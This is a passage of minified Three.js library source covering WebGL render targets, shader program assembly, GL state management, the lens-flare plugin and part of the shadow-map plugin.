THREE.WebGLRenderTarget))return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");if(e.__webglFramebuffer){if(e.format!==THREE.RGBAFormat)return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA format. readPixels can read only RGBA format.");var o=!1;e.__webglFramebuffer!==Ue&&(Ce.bindFramebuffer(Ce.FRAMEBUFFER,e.__webglFramebuffer),o=!0),Ce.checkFramebufferStatus(Ce.FRAMEBUFFER)===Ce.FRAMEBUFFER_COMPLETE?Ce.readPixels(t,r,i,n,Ce.RGBA,Ce.UNSIGNED_BYTE,a):console.error("THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete."),o&&Ce.bindFramebuffer(Ce.FRAMEBUFFER,Ue)}},this.initMaterial=function(){THREE.warn("THREE.WebGLRenderer: .initMaterial() has been removed.")},this.addPrePlugin=function(){THREE.warn("THREE.WebGLRenderer: .addPrePlugin() has been removed.")},this.addPostPlugin=function(){THREE.warn("THREE.WebGLRenderer: .addPostPlugin() has been removed.")},this.updateShadowMap=function(){THREE.warn("THREE.WebGLRenderer: .updateShadowMap() has been removed.")}},THREE.WebGLRenderTarget=function(e,t,r){this.width=e,this.height=t,r=r||{},this.wrapS=void 0!==r.wrapS?r.wrapS:THREE.ClampToEdgeWrapping,this.wrapT=void 0!==r.wrapT?r.wrapT:THREE.ClampToEdgeWrapping,this.magFilter=void 0!==r.magFilter?r.magFilter:THREE.LinearFilter,this.minFilter=void 0!==r.minFilter?r.minFilter:THREE.LinearMipMapLinearFilter,this.anisotropy=void 0!==r.anisotropy?r.anisotropy:1,this.offset=new THREE.Vector2(0,0),this.repeat=new THREE.Vector2(1,1),this.format=void 0!==r.format?r.format:THREE.RGBAFormat,this.type=void 0!==r.type?r.type:THREE.UnsignedByteType,this.depthBuffer=void 0!==r.depthBuffer?r.depthBuffer:!0,this.stencilBuffer=void 0!==r.stencilBuffer?r.stencilBuffer:!0,this.generateMipmaps=!0,this.shareDepthFrom=void 0!==r.shareDepthFrom?r.shareDepthFrom:null},THREE.WebGLRenderTarget.prototype={constructor:THREE.WebGLRenderTarget,setSize:function(e,t){this.width=e,this.height=t},clone:function(){var e=new THREE.WebGLRenderTarget(this.width,this.height);return e.wrapS=this.wrapS,e.wrapT=this.wrapT,e.magFilter=this.magFilter,e.minFilter=this.minFilter,e.anisotropy=this.anisotropy,e.offset.copy(this.offset),e.repeat.copy(this.repeat),e.format=this.format,e.type=this.type,e.depthBuffer=this.depthBuffer,e.stencilBuffer=this.stencilBuffer,e.generateMipmaps=this.generateMipmaps,e.shareDepthFrom=this.shareDepthFrom,e},dispose:function(){this.dispatchEvent({type:"dispose"})}},THREE.EventDispatcher.prototype.apply(THREE.WebGLRenderTarget.prototype),THREE.WebGLRenderTargetCube=function(e,t,r){THREE.WebGLRenderTarget.call(this,e,t,r),this.activeCubeFace=0},THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype),THREE.WebGLRenderTargetCube.prototype.constructor=THREE.WebGLRenderTargetCube,THREE.WebGLExtensions=function(e){var t={};this.get=function(r){if(void 0!==t[r])return t[r];var i;switch(r){case"EXT_texture_filter_anisotropic":i=e.getExtension("EXT_texture_filter_anisotropic")||e.getExtension("MOZ_EXT_texture_filter_anisotropic")||e.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":i=e.getExtension("WEBGL_compressed_texture_s3tc")||e.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":i=e.getExtension("WEBGL_compressed_texture_pvrtc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:i=e.getExtension(r)}return null===i&&THREE.warn("THREE.WebGLRenderer: "+r+" extension not supported."),t[r]=i,i}},THREE.WebGLProgram=function(){var e=0,t=function(e){var t,r,i=[];for(var n in e)t=e[n],t!==!1&&(r="#define "+n+" "+t,i.push(r));return i.join("\n")},r=function(e,t,r){for(var i={},n=0,a=r.length;a>n;n++){var o=r[n];i[o]=e.getUniformLocation(t,o)}return i},i=function(e,t,r){for(var i={},n=0,a=r.length;a>n;n++){var o=r[n];i[o]=e.getAttribLocation(t,o)}return i};return function(n,a,o,s){var h=n,l=h.context,c=o.defines,u=o.__webglShader.uniforms,E=o.attributes,f=o.__webglShader.vertexShader,p=o.__webglShader.fragmentShader,d=o.index0AttributeName;void 0===d&&s.morphTargets===!0&&(d="position");var m="SHADOWMAP_TYPE_BASIC";s.shadowMapType===THREE.PCFShadowMap?m="SHADOWMAP_TYPE_PCF":s.shadowMapType===THREE.PCFSoftShadowMap&&(m="SHADOWMAP_TYPE_PCF_SOFT");var T="ENVMAP_TYPE_CUBE",g="ENVMAP_MODE_REFLECTION",v="ENVMAP_BLENDING_MULTIPLY";if(s.envMap){switch(o.envMap.mapping){case THREE.CubeReflectionMapping:case THREE.CubeRefractionMapping:T="ENVMAP_TYPE_CUBE";break;case THREE.EquirectangularReflectionMapping:case THREE.EquirectangularRefractionMapping:T="ENVMAP_TYPE_EQUIREC";break;case THREE.SphericalReflectionMapping:T="ENVMAP_TYPE_SPHERE"}switch(o.envMap.mapping){case THREE.CubeRefractionMapping:case THREE.EquirectangularRefractionMapping:g="ENVMAP_MODE_REFRACTION"}switch(o.combine){case THREE.MultiplyOperation:v="ENVMAP_BLENDING_MULTIPLY";break;case THREE.MixOperation:v="ENVMAP_BLENDING_MIX";break;case THREE.AddOperation:v="ENVMAP_BLENDING_ADD"}}var R,y,H=n.gammaFactor>0?n.gammaFactor:1,x=t(c),b=l.createProgram();o instanceof THREE.RawShaderMaterial?(R="",y=""):(R=["precision "+s.precision+" float;","precision "+s.precision+" int;",x,s.supportsVertexTextures?"#define VERTEX_TEXTURES":"",h.gammaInput?"#define GAMMA_INPUT":"",h.gammaOutput?"#define GAMMA_OUTPUT":"","#define GAMMA_FACTOR "+H,"#define MAX_DIR_LIGHTS "+s.maxDirLights,"#define MAX_POINT_LIGHTS "+s.maxPointLights,"#define MAX_SPOT_LIGHTS "+s.maxSpotLights,"#define MAX_HEMI_LIGHTS "+s.maxHemiLights,"#define MAX_SHADOWS "+s.maxShadows,"#define MAX_BONES "+s.maxBones,s.map?"#define USE_MAP":"",s.envMap?"#define USE_ENVMAP":"",s.envMap?"#define "+g:"",s.lightMap?"#define USE_LIGHTMAP":"",s.bumpMap?"#define USE_BUMPMAP":"",s.normalMap?"#define USE_NORMALMAP":"",s.specularMap?"#define USE_SPECULARMAP":"",s.alphaMap?"#define USE_ALPHAMAP":"",s.vertexColors?"#define USE_COLOR":"",s.flatShading?"#define FLAT_SHADED":"",s.skinning?"#define USE_SKINNING":"",s.useVertexTexture?"#define BONE_TEXTURE":"",s.morphTargets?"#define USE_MORPHTARGETS":"",s.morphNormals?"#define USE_MORPHNORMALS":"",s.wrapAround?"#define WRAP_AROUND":"",s.doubleSided?"#define DOUBLE_SIDED":"",s.flipSided?"#define FLIP_SIDED":"",s.shadowMapEnabled?"#define USE_SHADOWMAP":"",s.shadowMapEnabled?"#define "+m:"",s.shadowMapDebug?"#define SHADOWMAP_DEBUG":"",s.shadowMapCascade?"#define SHADOWMAP_CASCADE":"",s.sizeAttenuation?"#define USE_SIZEATTENUATION":"",s.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","attribute vec2 uv2;","#ifdef USE_COLOR","	attribute vec3 color;","#endif","#ifdef USE_MORPHTARGETS","	attribute vec3 morphTarget0;","	attribute vec3 morphTarget1;","	attribute vec3 morphTarget2;","	attribute vec3 morphTarget3;","	#ifdef USE_MORPHNORMALS","		attribute vec3 morphNormal0;","		attribute vec3 morphNormal1;","		attribute vec3 morphNormal2;","		attribute vec3 morphNormal3;","	#else","		attribute vec3 morphTarget4;","		attribute vec3 morphTarget5;","		attribute vec3 morphTarget6;","		attribute vec3 morphTarget7;","	#endif","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",""].join("\n"),y=[s.bumpMap||s.normalMap||s.flatShading?"#extension GL_OES_standard_derivatives : enable":"","precision "+s.precision+" float;","precision "+s.precision+" int;",x,"#define MAX_DIR_LIGHTS "+s.maxDirLights,"#define MAX_POINT_LIGHTS "+s.maxPointLights,"#define MAX_SPOT_LIGHTS "+s.maxSpotLights,"#define MAX_HEMI_LIGHTS "+s.maxHemiLights,"#define MAX_SHADOWS "+s.maxShadows,s.alphaTest?"#define ALPHATEST "+s.alphaTest:"",h.gammaInput?"#define GAMMA_INPUT":"",h.gammaOutput?"#define GAMMA_OUTPUT":"","#define GAMMA_FACTOR "+H,s.useFog&&s.fog?"#define USE_FOG":"",s.useFog&&s.fogExp?"#define FOG_EXP2":"",s.map?"#define USE_MAP":"",s.envMap?"#define USE_ENVMAP":"",s.envMap?"#define "+T:"",s.envMap?"#define "+g:"",s.envMap?"#define "+v:"",s.lightMap?"#define USE_LIGHTMAP":"",s.bumpMap?"#define USE_BUMPMAP":"",s.normalMap?"#define USE_NORMALMAP":"",s.specularMap?"#define USE_SPECULARMAP":"",s.alphaMap?"#define USE_ALPHAMAP":"",s.vertexColors?"#define USE_COLOR":"",s.flatShading?"#define FLAT_SHADED":"",s.metal?"#define METAL":"",s.wrapAround?"#define WRAP_AROUND":"",s.doubleSided?"#define DOUBLE_SIDED":"",s.flipSided?"#define FLIP_SIDED":"",s.shadowMapEnabled?"#define USE_SHADOWMAP":"",s.shadowMapEnabled?"#define "+m:"",s.shadowMapDebug?"#define SHADOWMAP_DEBUG":"",s.shadowMapCascade?"#define SHADOWMAP_CASCADE":"",s.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;",""].join("\n"));var _=new THREE.WebGLShader(l,l.VERTEX_SHADER,R+f),w=new THREE.WebGLShader(l,l.FRAGMENT_SHADER,y+p);l.attachShader(b,_),l.attachShader(b,w),void 0!==d&&l.bindAttribLocation(b,0,d),l.linkProgram(b);var M=l.getProgramInfoLog(b);l.getProgramParameter(b,l.LINK_STATUS)===!1&&THREE.error("THREE.WebGLProgram: shader error: "+l.getError(),"gl.VALIDATE_STATUS",l.getProgramParameter(b,l.VALIDATE_STATUS),"gl.getPRogramInfoLog",M),""!==M&&THREE.warn("THREE.WebGLProgram: gl.getProgramInfoLog()"+M),l.deleteShader(_),l.deleteShader(w);var S=["viewMatrix","modelViewMatrix","projectionMatrix","normalMatrix","modelMatrix","cameraPosition","morphTargetInfluences","bindMatrix","bindMatrixInverse"];s.useVertexTexture?(S.push("boneTexture"),S.push("boneTextureWidth"),S.push("boneTextureHeight")):S.push("boneGlobalMatrices"),s.logarithmicDepthBuffer&&S.push("logDepthBufFC");for(var A in u)S.push(A);this.uniforms=r(l,b,S),S=["position","normal","uv","uv2","tangent","color","skinIndex","skinWeight","lineDistance"];for(var C=0;C<s.maxMorphTargets;C++)S.push("morphTarget"+C);for(var C=0;C<s.maxMorphNormals;C++)S.push("morphNormal"+C);for(var L in E)S.push(L);return this.attributes=i(l,b,S),this.attributesKeys=Object.keys(this.attributes),this.id=e++,this.code=a,this.usedTimes=1,this.program=b,this.vertexShader=_,this.fragmentShader=w,this}}(),THREE.WebGLShader=function(){var e=function(e){for(var t=e.split("\n"),r=0;r<t.length;r++)t[r]=r+1+": "+t[r];return t.join("\n")};return function(t,r,i){var n=t.createShader(r);return t.shaderSource(n,i),t.compileShader(n),t.getShaderParameter(n,t.COMPILE_STATUS)===!1&&THREE.error("THREE.WebGLShader: Shader couldn't compile."),""!==t.getShaderInfoLog(n)&&THREE.warn("THREE.WebGLShader: gl.getShaderInfoLog()",t.getShaderInfoLog(n),e(i)),n}}(),THREE.WebGLState=function(e,t){var r=new Uint8Array(16),i=new Uint8Array(16),n=null,a=null,o=null,s=null,h=null,l=null,c=null,u=null,E=null,f=null,p=null,d=null,m=null,T=null,g=null,v=null;this.initAttributes=function(){for(var e=0,t=r.length;t>e;e++)r[e]=0},this.enableAttribute=function(t){r[t]=1,0===i[t]&&(e.enableVertexAttribArray(t),i[t]=1)},this.disableUnusedAttributes=function(){for(var t=0,n=i.length;n>t;t++)i[t]!==r[t]&&(e.disableVertexAttribArray(t),i[t]=0)},this.setBlending=function(r,i,u,E,f,p,d){r!==n&&(r===THREE.NoBlending?e.disable(e.BLEND):r===THREE.AdditiveBlending?(e.enable(e.BLEND),e.blendEquation(e.FUNC_ADD),e.blendFunc(e.SRC_ALPHA,e.ONE)):r===THREE.SubtractiveBlending?(e.enable(e.BLEND),e.blendEquation(e.FUNC_ADD),e.blendFunc(e.ZERO,e.ONE_MINUS_SRC_COLOR)):r===THREE.MultiplyBlending?(e.enable(e.BLEND),e.blendEquation(e.FUNC_ADD),e.blendFunc(e.ZERO,e.SRC_COLOR)):r===THREE.CustomBlending?e.enable(e.BLEND):(e.enable(e.BLEND),e.blendEquationSeparate(e.FUNC_ADD,e.FUNC_ADD),e.blendFuncSeparate(e.SRC_ALPHA,e.ONE_MINUS_SRC_ALPHA,e.ONE,e.ONE_MINUS_SRC_ALPHA)),n=r),r===THREE.CustomBlending?(f=f||i,p=p||u,d=d||E,(i!==a||f!==h)&&(e.blendEquationSeparate(t(i),t(f)),a=i,h=f),(u!==o||E!==s||p!==l||d!==c)&&(e.blendFuncSeparate(t(u),t(E),t(p),t(d)),o=u,s=E,l=p,c=d)):(a=null,o=null,s=null,h=null,l=null,c=null)},this.setDepthTest=function(t){u!==t&&(t?e.enable(e.DEPTH_TEST):e.disable(e.DEPTH_TEST),u=t)},this.setDepthWrite=function(t){E!==t&&(e.depthMask(t),E=t)},this.setColorWrite=function(t){f!==t&&(e.colorMask(t,t,t,t),f=t)},this.setDoubleSided=function(t){p!==t&&(t?e.disable(e.CULL_FACE):e.enable(e.CULL_FACE),p=t)},this.setFlipSided=function(t){d!==t&&(t?e.frontFace(e.CW):e.frontFace(e.CCW),d=t)},this.setLineWidth=function(t){t!==m&&(e.lineWidth(t),m=t)},this.setPolygonOffset=function(t,r,i){T!==t&&(t?e.enable(e.POLYGON_OFFSET_FILL):e.disable(e.POLYGON_OFFSET_FILL),T=t),!t||g===r&&v===i||(e.polygonOffset(r,i),g=r,v=i)},this.reset=function(){for(var e=0;e<i.length;e++)i[e]=0;n=null,u=null,E=null,f=null,p=null,d=null}},THREE.LensFlarePlugin=function(e,t){function r(t){var r=u.createProgram(),i=u.createShader(u.FRAGMENT_SHADER),n=u.createShader(u.VERTEX_SHADER),a="precision "+e.getPrecision()+" float;\n";return u.shaderSource(i,a+t.fragmentShader),u.shaderSource(n,a+t.vertexShader),u.compileShader(i),u.compileShader(n),u.attachShader(r,i),u.attachShader(r,n),u.linkProgram(r),r}var i,n,a,o,s,h,l,c,u=e.context,E=function(){var e=new Float32Array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),t=new Uint16Array([0,1,2,0,2,3]);i=u.createBuffer(),n=u.createBuffer(),u.bindBuffer(u.ARRAY_BUFFER,i),u.bufferData(u.ARRAY_BUFFER,e,u.STATIC_DRAW),u.bindBuffer(u.ELEMENT_ARRAY_BUFFER,n),u.bufferData(u.ELEMENT_ARRAY_BUFFER,t,u.STATIC_DRAW),l=u.createTexture(),c=u.createTexture(),u.bindTexture(u.TEXTURE_2D,l),u.texImage2D(u.TEXTURE_2D,0,u.RGB,16,16,0,u.RGB,u.UNSIGNED_BYTE,null),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_WRAP_S,u.CLAMP_TO_EDGE),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_WRAP_T,u.CLAMP_TO_EDGE),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_MAG_FILTER,u.NEAREST),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_MIN_FILTER,u.NEAREST),u.bindTexture(u.TEXTURE_2D,c),u.texImage2D(u.TEXTURE_2D,0,u.RGBA,16,16,0,u.RGBA,u.UNSIGNED_BYTE,null),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_WRAP_S,u.CLAMP_TO_EDGE),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_WRAP_T,u.CLAMP_TO_EDGE),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_MAG_FILTER,u.NEAREST),u.texParameteri(u.TEXTURE_2D,u.TEXTURE_MIN_FILTER,u.NEAREST),h=u.getParameter(u.MAX_VERTEX_TEXTURE_IMAGE_UNITS)>0;var E;E=h?{vertexShader:["uniform lowp int renderType;","uniform vec3 screenPosition;","uniform vec2 scale;","uniform float rotation;","uniform sampler2D occlusionMap;","attribute vec2 position;","attribute vec2 uv;","varying vec2 vUV;","varying float vVisibility;","void main() {","vUV = uv;","vec2 pos = position;","if( renderType == 2 ) {","vec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );","visibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );","visibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );","visibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );","visibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );","visibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );","visibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );","visibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );","visibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );","vVisibility =        visibility.r / 9.0;","vVisibility *= 1.0 - visibility.g / 9.0;","vVisibility *=       visibility.b / 9.0;","vVisibility *= 1.0 - visibility.a / 9.0;","pos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;","pos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;","}","gl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );","}"].join("\n"),fragmentShader:["uniform lowp int renderType;","uniform sampler2D map;","uniform float opacity;","uniform vec3 color;","varying vec2 vUV;","varying float vVisibility;","void main() {","if( renderType == 0 ) {","gl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );","} else if( renderType == 1 ) {","gl_FragColor = texture2D( map, vUV );","} else {","vec4 texture = texture2D( map, vUV );","texture.a *= opacity * vVisibility;","gl_FragColor = texture;","gl_FragColor.rgb *= color;","}","}"].join("\n")}:{vertexShader:["uniform lowp int renderType;","uniform vec3 screenPosition;","uniform vec2 scale;","uniform float rotation;","attribute vec2 position;","attribute vec2 uv;","varying vec2 vUV;","void main() {","vUV = uv;","vec2 pos = position;","if( renderType == 2 ) {","pos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;","pos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;","}","gl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );","}"].join("\n"),fragmentShader:["precision mediump float;","uniform lowp int renderType;","uniform sampler2D map;","uniform sampler2D occlusionMap;","uniform float opacity;","uniform vec3 color;","varying vec2 vUV;","void main() {","if( renderType == 0 ) {","gl_FragColor = vec4( texture2D( map, vUV ).rgb, 0.0 );","} else if( renderType == 1 ) {","gl_FragColor = texture2D( map, vUV );","} else {","float visibility = texture2D( occlusionMap, vec2( 0.5, 0.1 ) ).a;","visibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) ).a;","visibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) ).a;","visibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) ).a;","visibility = ( 1.0 - visibility / 4.0 );","vec4 texture = texture2D( map, vUV );","texture.a *= opacity * visibility;","gl_FragColor = texture;","gl_FragColor.rgb *= color;","}","}"].join("\n")},a=r(E),o={vertex:u.getAttribLocation(a,"position"),uv:u.getAttribLocation(a,"uv")},s={renderType:u.getUniformLocation(a,"renderType"),map:u.getUniformLocation(a,"map"),occlusionMap:u.getUniformLocation(a,"occlusionMap"),opacity:u.getUniformLocation(a,"opacity"),color:u.getUniformLocation(a,"color"),scale:u.getUniformLocation(a,"scale"),rotation:u.getUniformLocation(a,"rotation"),screenPosition:u.getUniformLocation(a,"screenPosition")}};this.render=function(r,f,p,d){if(0!==t.length){var m=new THREE.Vector3,T=d/p,g=.5*p,v=.5*d,R=16/d,y=new THREE.Vector2(R*T,R),H=new THREE.Vector3(1,1,0),x=new THREE.Vector2(1,1);void 0===a&&E(),u.useProgram(a),u.enableVertexAttribArray(o.vertex),u.enableVertexAttribArray(o.uv),u.uniform1i(s.occlusionMap,0),u.uniform1i(s.map,1),u.bindBuffer(u.ARRAY_BUFFER,i),u.vertexAttribPointer(o.vertex,2,u.FLOAT,!1,16,0),u.vertexAttribPointer(o.uv,2,u.FLOAT,!1,16,8),u.bindBuffer(u.ELEMENT_ARRAY_BUFFER,n),u.disable(u.CULL_FACE),u.depthMask(!1);for(var b=0,_=t.length;_>b;b++){R=16/d,y.set(R*T,R);var w=t[b];if(m.set(w.matrixWorld.elements[12],w.matrixWorld.elements[13],w.matrixWorld.elements[14]),m.applyMatrix4(f.matrixWorldInverse),m.applyProjection(f.projectionMatrix),H.copy(m),x.x=H.x*g+g,x.y=H.y*v+v,h||x.x>0&&x.x<p&&x.y>0&&x.y<d){u.activeTexture(u.TEXTURE1),u.bindTexture(u.TEXTURE_2D,l),u.copyTexImage2D(u.TEXTURE_2D,0,u.RGB,x.x-8,x.y-8,16,16,0),u.uniform1i(s.renderType,0),u.uniform2f(s.scale,y.x,y.y),u.uniform3f(s.screenPosition,H.x,H.y,H.z),u.disable(u.BLEND),u.enable(u.DEPTH_TEST),u.drawElements(u.TRIANGLES,6,u.UNSIGNED_SHORT,0),u.activeTexture(u.TEXTURE0),u.bindTexture(u.TEXTURE_2D,c),u.copyTexImage2D(u.TEXTURE_2D,0,u.RGBA,x.x-8,x.y-8,16,16,0),u.uniform1i(s.renderType,1),u.disable(u.DEPTH_TEST),u.activeTexture(u.TEXTURE1),u.bindTexture(u.TEXTURE_2D,l),u.drawElements(u.TRIANGLES,6,u.UNSIGNED_SHORT,0),w.positionScreen.copy(H),w.customUpdateCallback?w.customUpdateCallback(w):w.updateLensFlares(),u.uniform1i(s.renderType,2),u.enable(u.BLEND);for(var M=0,S=w.lensFlares.length;S>M;M++){var A=w.lensFlares[M];A.opacity>.001&&A.scale>.001&&(H.x=A.x,H.y=A.y,H.z=A.z,R=A.size*A.scale/d,y.x=R*T,y.y=R,u.uniform3f(s.screenPosition,H.x,H.y,H.z),u.uniform2f(s.scale,y.x,y.y),u.uniform1f(s.rotation,A.rotation),u.uniform1f(s.opacity,A.opacity),u.uniform3f(s.color,A.color.r,A.color.g,A.color.b),e.state.setBlending(A.blending,A.blendEquation,A.blendSrc,A.blendDst),e.setTexture(A.texture,1),u.drawElements(u.TRIANGLES,6,u.UNSIGNED_SHORT,0))}}}u.enable(u.CULL_FACE),u.enable(u.DEPTH_TEST),u.depthMask(!0),e.resetGLState()}}},THREE.ShadowMapPlugin=function(e,t,r,i){function n(e,t,i){if(t.visible){var a=r[t.id];if(a&&t.castShadow&&(t.frustumCulled===!1||p.intersectsObject(t)===!0))for(var o=0,s=a.length;s>o;o++){var h=a[o];t._modelViewMatrix.multiplyMatrices(i.matrixWorldInverse,t.matrixWorld),v.push(h)}for(var o=0,s=t.children.length;s>o;o++)n(e,t.children[o],i)}}function a(e,t){var r=new THREE.DirectionalLight;r.isVirtual=!0,r.onlyShadow=!0,r.castShadow=!0,r.shadowCameraNear=e.shadowCameraNear,r.shadowCameraFar=e.shadowCameraFar,r.shadowCameraLeft=e.shadowCameraLeft,r.shadowCameraRight=e.shadowCameraRight,r.shadowCameraBottom=e.shadowCameraBottom,r.shadowCameraTop=e.shadowCameraTop,r.shadowCameraVisible=e.shadowCameraVisible,r.shadowDarkness=e.shadowDarkness,
r.shadowBias=e.shadowCascadeBias[t],r.shadowMapWidth=e.shadowCascadeWidth[t],r.shadowMapHeight=e.shadowCascadeHeight[t],r.pointsWorld=[],r.pointsFrustum=[];for(var i=r.pointsWorld,n=r.pointsFrustum,a=0;8>a;a++)i[a]=new THREE.Vector3,n[a]=new THREE.Vector3;var o=e.shadowCascadeNearZ[t],s=e.shadowCascadeFarZ[t];return n[0].set(-1,-1,o),n[1].set(1,-1,o),n[2].set(-1,1,o),n[3].set(1,1,o),n[4].set(-1,-1,s),n[5].set(1,-1,s),n[6].set(-1,1,s),n[7].set(1,1,s),r}function o(e,t){var r=e.shadowCascadeArray[t];r.position.copy(e.position),r.target.position.copy(e.target.position),r.lookAt(r.target),r.shadowCameraVisible=e.shadowCameraVisible,r.shadowDarkness=e.shadowDarkness,r.shadowBias=e.shadowCascadeBias[t];var i=e.shadowCascadeNearZ[t],n=e.shadowCascadeFarZ[t],a=r.pointsFrustum;a[0].z=i,a[1].z=i,a[2].z=i,a[3].z=i,a[4].z=n,a[5].z=n,a[6].z=n,a[7].z=n}function s(e,t){var r=t.shadowCamera,i=t.pointsFrustum,n=t.pointsWorld;m.set(1/0,1/0,1/0),T.set(-(1/0),-(1/0),-(1/0));for(var a=0;8>a;a++){var o=n[a];o.copy(i[a]),o.unproject(e),o.applyMatrix4(r.matrixWorldInverse),o.x<m.x&&(m.x=o.x),o.x>T.x&&(T.x=o.x),o.y<m.y&&(m.y=o.y),o.y>T.y&&(T.y=o.y),o.z<m.z&&(m.z=o.z),o.z>T.z&&(T.z=o.z)}r.left=m.x,r.right=T.x,r.top=T.y,r.bottom=m.y,r.updateProjectionMatrix()}function h(e){return e.material instanceof THREE.MeshFaceMaterial?e.material.materials[0]:e.material}var l,c,u,E,f=e.context,p=new THREE.Frustum,d=new THREE.Matrix4,m=new THREE.Vector3,T=new THREE.Vector3,g=new THREE.Vector3,v=[],R=THREE.ShaderLib.depthRGBA,y=THREE.UniformsUtils.clone(R.uniforms);l=new THREE.ShaderMaterial({uniforms:y,vertexShader:R.vertexShader,fragmentShader:R.fragmentShader}),c=new THREE.ShaderMaterial({uniforms:y,vertexShader:R.vertexShader,fragmentShader:R.fragmentShader,morphTargets:!0}),u=new THREE.ShaderMaterial({uniforms:y,vertexShader:R.vertexShader,fragmentShader:R.fragmentShader,skinning:!0}),E=new THREE.ShaderMaterial({uniforms:y,vertexShader:R.vertexShader,fragmentShader:R.fragmentShader,morphTargets:!0,skinning:!0}),l._shadowPass=!0,c._shadowPass=!0,u._shadowPass=!0,E._shadowPass=!0,this.render=function(r,m){if(e.shadowMapEnabled!==!1){var T,R,y,H,x,b,_,w,M,S,A,C,L,P=[],F=0,U=null;for(f.clearColor(1,1,1,1),f.disable(f.BLEND),f.enable(f.CULL_FACE),f.frontFace(f.CCW),e.shadowMapCullFace===THREE.CullFaceFront?f.cullFace(f.FRONT):f.cullFace(f.BACK),e.state.setDepthTest(!0),T=0,R=t.length;R>T;T++)if(L=t[T],L.castShadow)if(L instanceof THREE.DirectionalLight&&L.shadowCascade)for(x=0;x<L.shadowCascadeCount;x++){var B;if(L.shadowCascadeArray[x])B=L.shadowCascadeArray[x];else{B=a(L,x),B.originalCamera=m;var D=new THREE.Gyroscope;D.position.copy(L.shadowCascadeOffset),D.add(B),D.add(B.target),m.add(D),L.shadowCascadeArray[x]=B}o(L,x),P[F]=B,F++}else P[F]=L,F++;for(T=0,R=P.length;R>T;T++){if(L=P[T],!L.shadowMap){var V=THREE.LinearFilter;e.shadowMapType===THREE.PCFSoftShadowMap&&(V=THREE.NearestFilter);var z={minFilter:V,magFilter:V,format:THREE.RGBAFormat};L.shadowMap=new THREE.WebGLRenderTarget(L.shadowMapWidth,L.shadowMapHeight,z),L.shadowMapSize=new THREE.Vector2(L.shadowMapWidth,L.shadowMapHeight),L.shadowMatrix=new THREE.Matrix4}if(!L.shadowCamera){if(L instanceof THREE.SpotLight)L.shadowCamera=new THREE.PerspectiveCamera(L.shadowCameraFov,L.shadowMapWidth/L.shadowMapHeight,L.shadowCameraNear,L.shadowCameraFar);else{if(!(L instanceof THREE.DirectionalLight)){THREE.error("THREE.ShadowMapPlugin: Unsupported light type for shadow",L);continue}L.shadowCamera=new THREE.OrthographicCamera(L.shadowCameraLeft,L.shadowCameraRight,L.shadowCameraTop,L.shadowCameraBottom,L.shadowCameraNear,L.shadowCameraFar)}r.add(L.shadowCamera),r.autoUpdate===!0&&r.updateMatrixWorld()}L.shadowCameraVisible&&!L.cameraHelper&&(L.cameraHelper=new THREE.CameraHelper(L.shadowCamera),r.add(L.cameraHelper)),L.isVirtual&&B.originalCamera==m&&s(m,L),b=L.shadowMap,_=L.shadowMatrix,w=L.shadowCamera,w.position.setFromMatrixPosition(L.matrixWorld),g.setFromMatrixPosition(L.target.matrixWorld),w.lookAt(g),w.updateMatrixWorld(),w.matrixWorldInverse.getInverse(w.matrixWorld),L.cameraHelper&&(L.cameraHelper.visible=L.shadowCameraVisible),L.shadowCameraVisible&&L.cameraHelper.update(),_.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),_.multiply(w.projectionMatrix),_.multiply(w.matrixWorldInverse),d.multiplyMatrices(w.projectionMatrix,w.matrixWorldInverse),p.setFromMatrix(d),e.setRenderTarget(b),e.clear(),v.length=0,n(r,r,w);var k,N,O;for(y=0,H=v.length;H>y;y++)A=v[y],C=A.object,M=A.buffer,k=h(C),N=void 0!==C.geometry.morphTargets&&C.geometry.morphTargets.length>0&&k.morphTargets,O=C instanceof 